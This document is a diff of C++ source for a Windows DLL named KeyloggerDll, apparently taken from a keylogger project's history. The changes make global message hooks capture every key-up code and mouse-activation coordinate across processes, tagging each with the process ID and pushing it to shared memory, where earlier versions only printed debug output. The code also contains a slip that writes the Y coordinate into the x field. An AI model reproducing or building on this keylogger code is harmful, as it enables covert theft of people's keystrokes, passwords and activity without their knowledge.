@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include "KeyloggerDll.h"
+#include <Windowsx.h>
 
 #include <sstream>
 
@@ -21,30 +22,17 @@ void	KeyloggerDll::setModuleHandle(HMODULE hModule)
 	this->_hModule = hModule;
 }
 
-// Get singleton unique instance
-//KeyloggerDll& KeyloggerDll::GetInstance()
-//{
-//	static KeyloggerDll instance;
-//	return (instance);
-//}
-
 LRESULT CALLBACK KeyloggerDll::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	MSG *msg;
-	if (nCode >= 0)
+	MSG *msg = (MSG*)lParam;
+	if (nCode >= 0 && msg->message == WM_KEYUP)
 	{
-		msg = (MSG*)lParam;
-		if (msg->message == WM_KEYUP)
-		{
-			Data		data;
+		Data		data;
 
-			data.t = KEYPRESS;
-			data.data.key.keyCode = msg->wParam;
-			//_shm.push(data);
-			std::wostringstream out;
-			out << " Key : " << msg->wParam;
-			OutputDebugStringW(out.str().c_str());
-		}
+		data.pid = GetCurrentProcessId();
+		data.t = KEYPRESS;
+		data.data.key.keyCode = msg->wParam;
+		_shm.push(data);
 	}
 	return CallNextHookEx(this->_postMsgHook, nCode, wParam, lParam);
 }
@@ -55,36 +43,22 @@ LRESULT CALLBACK KeyloggerDll::CallWndProc(
 	_In_  LPARAM lParam
 	)
 {
-	if (nCode >= 0)
+	CWPSTRUCT	*cwp = (CWPSTRUCT*)lParam;
+	if (nCode >= 0 && cwp->message == WM_MOUSEACTIVATE)
 	{
-		CWPSTRUCT	*cwp = (CWPSTRUCT*)lParam;
-		DWORD		pid = GetCurrentProcessId();
-		wchar_t		winName[128];
+		Data test;
 
-		GetWindowText(cwp->hwnd, winName, 128);
-
-		std::wostringstream out;
-
-
-		out << "[" << pid << "] : " << std::hex << cwp->message;
-		//OutputDebugStringW(out.str().c_str());
-
-		if (cwp->message == WM_MOUSEACTIVATE)
-		{
-			Data test;
-
-			test.t = MOUSELOG;
-			//_shm.push(test);
-			//OutputDebugStringW(L"Kefefefwefewey pressed MYGL !");
-			OutputDebugStringW(out.str().c_str());
-		}
+		test.pid = GetCurrentProcessId();
+		test.t = MOUSELOG;
+		test.data.mouse.x = GET_X_LPARAM(cwp->lParam);
+		test.data.mouse.x = GET_Y_LPARAM(cwp->lParam);
+		_shm.push(test);
 	}
 	return CallNextHookEx(this->_getMsgHook, nCode, wParam, lParam);
 }
 
 int KeyloggerDll::loadHook()
 {
-
 	if (!(this->_getMsgHook = SetWindowsHookEx(WH_CALLWNDPROC, CallWndProcFn, _hModule, 0)))
 	{
 		MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
